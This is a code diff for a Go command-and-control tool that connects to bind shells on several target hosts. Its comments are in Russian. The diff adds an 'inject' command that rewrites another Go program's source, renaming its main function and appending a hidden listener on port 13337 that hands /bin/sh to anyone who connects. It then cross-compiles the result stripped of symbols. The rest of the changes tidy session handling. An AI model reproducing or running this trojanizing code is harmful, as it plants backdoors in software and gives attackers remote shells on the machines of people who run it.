@@ -6,6 +6,7 @@ import (
 	"log"
 	"net"
 	"os"
+	"os/exec"
 	"strconv"
 	"strings"
 	"time"
@@ -26,6 +27,7 @@ func BindShellHelp() {
 	fmt.Println("[BindShell] Command list:")
 	fmt.Println("\t- /BS add <ip:port> \t\tAdd target <ip>:<port> to set;")
 	fmt.Println("\t- /BS help \t\t\tShow this list;")
+	fmt.Println("\t- /BS inject \t\t\tInject bind shell to code and compile it;")
 	fmt.Println("\t- /BS off <index> \t\tStop sending commands to the host;")
 	fmt.Println("\t- /BS on <index> \t\tResume sending commands to the host;")
 	fmt.Println("\t- /BS remove <index> \t\tRemove target from set;")
@@ -72,6 +74,11 @@ func BindShellRemove(targets *[]Target, idx int) {
 
 // Приостановление взаимодействия с целью (вызов: /BS off)
 func BindShellOff(targets *[]Target, idx int) {
+	if (*targets)[idx].status == false {
+		fmt.Println("[BindShell] The host is already an inactive target!")
+		return
+	}
+
 	active_targets--
 	(*targets)[idx].status = false
 	fmt.Printf("[BindShell] %s off.\n", (*targets)[idx].name)
@@ -79,6 +86,11 @@ func BindShellOff(targets *[]Target, idx int) {
 
 // Возобновление взаимодействия с целью (вызов: /BS on)
 func BindShellOn(targets *[]Target, idx int) {
+	if (*targets)[idx].status == true {
+		fmt.Println("[BindShell] The host is already an active target!")
+		return
+	}
+
 	active_targets++
 	(*targets)[idx].status = true
 	fmt.Printf("[BindShell] %s on.\n", (*targets)[idx].name)
@@ -92,7 +104,6 @@ func BindShellTimeout(value int) {
 
 // Устанавливает соединение с выбранным хостом и добавляет его в список целей (вызов: /BS add)
 func BindShellAdd(targets *[]Target, target_name string) {
-	active_targets++
 	addSession(targets, target_name)
 }
 
@@ -100,13 +111,16 @@ func addSession(targets *[]Target, target_name string) {
 	// Установка соединения с целевым хостом
 	conn, err := net.Dial("tcp", target_name)
 	if err != nil {
-		log.Fatalln(err)
+		fmt.Printf("[BindShell] %s << Connection NOT established.\n", target_name)
+		return
 	} else {
 		fmt.Printf("[BindShell] %s << Connection successfully established.\n", target_name)
 	}
 
 	// Добавление хоста в список целей
 	*targets = append(*targets, Target{name: target_name, conn: conn, status: true})
+
+	active_targets++
 }
 
 func finishSession(target Target) {
@@ -173,24 +187,236 @@ func BindShellLoadTargets(targets *[]Target, targets_file string) {
 
 		// Добавление сессии
 		addSession(targets, target_name)
-
-		active_targets++
 	}
 }
 
+func BindShellInject(file_path string, OS string, Arch string) {
+	// Открытие оригинального файла
+	original_file, err := os.OpenFile(file_path, os.O_RDWR|os.O_APPEND, 0644)
+	if err != nil {
+		fmt.Printf("[BindShell] Can't open file %s with error: %s\n", file_path, err.Error())
+		return
+	}
+	defer original_file.Close()
+
+	lines := []string{}
+	imports := []string{}
+	new_imports := []string{}
+	var isImportSection bool
+
+	// Создание сканера для построчного чтения файла
+	scanner := bufio.NewScanner(original_file)
+
+	for scanner.Scan() {
+		line := scanner.Text()
+
+		// Изменение имени исходной функции main
+		if strings.HasPrefix(line, "func main") {
+			line = strings.Replace(line, "func main", "func main_payload", 1)
+			fmt.Println("main found and replaced.")
+		}
+
+		// Проверяем, начинаем ли мы секцию импорта
+		if strings.HasPrefix(line, "import (") {
+			isImportSection = true
+		}
+
+		// Если мы находимся в секции импорта, собираем импорты
+		if isImportSection {
+			if strings.TrimSpace(line) == ")" {
+				isImportSection = false
+			} else {
+				imports = append(imports, strings.TrimSpace(line))
+			}
+		}
+
+		lines = append(lines, line)
+	}
+
+	/*
+		if err := scanner.Err(); err != nil {
+			fmt.Println("Scanning error!")
+			return
+		}
+	*/
+	fmt.Println(len(lines))
+
+	// Проверка и добавление необходимых импортов
+	requiredImports := []string{"\"io\"", "\"net\"", "\"os/exec\""}
+	for _, reqImport := range requiredImports {
+		if !contains(imports, reqImport) {
+			new_imports = append(new_imports, reqImport)
+			fmt.Printf("Импорт %s добавлен.\n", reqImport)
+		}
+	}
+
+	// Обновляем секцию импорта в строках
+	if len(new_imports) > 0 {
+		lines = updateImports(lines, new_imports)
+	}
+
+	err = os.WriteFile("result.go", []byte(strings.Join(lines, "\n")), 0644)
+
+	new_file, err := os.OpenFile("result.go", os.O_RDWR|os.O_APPEND, 0644)
+	if err != nil {
+		fmt.Printf("[BindShell] Can't open file %s with error: %s\n", new_file.Name(), err.Error())
+		return
+	}
+	defer new_file.Close()
+
+	if err != nil {
+		fmt.Println("Writing error!")
+		return
+	}
+
+	// Строка с инъекцией
+	BS_string := "\n\nfunc bs_handle(BS_conn net.Conn) {\n\tcmd := exec.Command(\"/bin/sh\")\n\trp, wp := io.Pipe()\n\tcmd.Stdin = BS_conn\n\tcmd.Stdout = wp\n\tgo io.Copy(BS_conn, rp)\n\tcmd.Run()\n\tBS_conn.Close()\n}\n\nfunc bs_payload() {\n\tBS_listener, _ := net.Listen(\"tcp\", \":13337\")\n\tfor {\n\t\tBS_conn, _ := BS_listener.Accept()\n\t\tgo bs_handle(BS_conn)\n\t}\n}\n\nfunc main() {\n\tgo bs_payload()\n\tmain_payload()\n}"
+
+	// Добавление инъекции в файл
+	if _, err := new_file.WriteString(BS_string); err != nil {
+		fmt.Printf("[BindShell] Can't modify file %s with error: %s\n", "result.go", err.Error())
+		return
+	}
+
+	// Компиляция файла
+	// Сохранение прежних значений переменных среды
+	old_GOOS := os.Getenv("GOOS")
+	old_GOARCH := os.Getenv("GOARCH")
+
+	// Замена переменной окружения GOOS на целевую ОС
+	err = os.Setenv("GOOS", OS)
+	if err != nil {
+		fmt.Println("[BindShell] Can't change GOOS!", err)
+		return
+	}
+
+	// Замена переменной окружения ARCHOS на целевую архитектуру
+	err = os.Setenv("GOARCH", Arch)
+	if err != nil {
+		fmt.Println("[BindShell] Can't change GOARCH!", err)
+		return
+	}
+
+	// Компиляция файла
+	cmd := exec.Command("go", "build", "-o", "result", "-ldflags", "-w -s", "result.go")
+	if err := cmd.Run(); err != nil {
+		fmt.Println("[BindShell] Compilation error!", err)
+		return
+	}
+
+	// Замена переменной окружения GOOS на исходную ОС
+	err = os.Setenv("GOOS", old_GOOS)
+	if err != nil {
+		fmt.Println("[BindShell] Can't change GOOS!", err)
+		return
+	}
+
+	// Замена переменной окружения ARCHOS на исходную архитектуру
+	err = os.Setenv("GOARCH", old_GOARCH)
+	if err != nil {
+		fmt.Println("[BindShell] Can't change GOARCH!", err)
+		return
+	}
+
+	fmt.Println("[BindShell] File successfully compiled.")
+}
+
+// Проверяет наличие необходимых импортов
+func contains(imports []string, imp string) bool {
+	for _, i := range imports {
+		if i == imp {
+			return true
+		}
+	}
+	return false
+}
+
+// Обновляет секцию импортов
+func updateImports(lines []string, new_imports []string) []string {
+	var updatedLines []string
+	importSectionStarted := false
+
+	for _, line := range lines {
+		if strings.HasPrefix(line, "import (") {
+			importSectionStarted = true
+			updatedLines = append(updatedLines, line)
+			for _, imp := range new_imports {
+				updatedLines = append(updatedLines, "\t"+imp)
+			}
+			continue // Пропускаем добавление закрывающей скобки здесь
+		}
+
+		if importSectionStarted && strings.TrimSpace(line) == ")" {
+			importSectionStarted = false
+		}
+
+		updatedLines = append(updatedLines, line)
+	}
+
+	if importSectionStarted { // Если секция импорта была открыта, добавим закрывающую скобку
+		updatedLines = append(updatedLines, ")")
+	}
+
+	return updatedLines
+}
+
 func BindShellRequest(request []string, targets *[]Target) {
+	// В случае, если конкретная инструкция не указана, вызывается /BS help
+	if len(request) == 1 {
+		BindShellHelp()
+	}
+
 	switch request[1] {
 	case "add":
+		if len(request) < 3 {
+			return
+		}
 		BindShellAdd(targets, request[2])
 	case "help":
 		BindShellHelp()
+	case "inject":
+		BindShellInject(request[2], request[3], request[4])
 	case "off":
+		// Если аргументов более трех, остановка
+		if len(request) > 3 {
+			fmt.Println("[BindShell] Error! Correct usage: \"/BS off\" or \"/BS off <host_id>\"\n")
+			return
+		}
+
+		// Если не указан конкретный хост, приостановить всё
+		if len(request) == 2 {
+			for i := 0; i < len(*targets); i++ {
+				BindShellOff(targets, i)
+			}
+			return
+		}
+
+		// Иначе - проверка корректности идентификатора
 		ok, idx := checkTargetNumber(targets, request[2])
+
+		// Если идентификатор корректен, приостановить действия на выбранном хосте
 		if ok {
 			BindShellOff(targets, idx)
 		}
 	case "on":
+		// Если аргументов более трех, остановка
+		if len(request) > 3 {
+			fmt.Println("[BindShell] Error! Correct usage: \"/BS on\" or \"/BS on <host_id>\"\n")
+			return
+		}
+
+		// Если не указан конкретный хост, возобновить всё
+		if len(request) == 2 {
+			for i := 0; i < len(*targets); i++ {
+				BindShellOn(targets, i)
+			}
+			return
+		}
+
+		// Иначе - проверка корректности идентификатора
 		ok, idx := checkTargetNumber(targets, request[2])
+
+		// Если идентификатор корректен, возобновить действия на выбранном хосте
 		if ok {
 			BindShellOn(targets, idx)
 		}
@@ -282,15 +508,12 @@ func main() {
 				}
 			}
 
+			// Получение ответов от каждого активного хоста
 			for i := 0; i < active_targets; i++ {
-				//select {
 				response := <-ch_resp
 				if len(response) > 0 {
 					fmt.Println(response)
 				}
-				//case <-time.After(time.Duration(global_response_waiting) * time.Millisecond):
-				//	fmt.Println("Timeout waiting for response")
-				//}
 			}
 		}
 	}
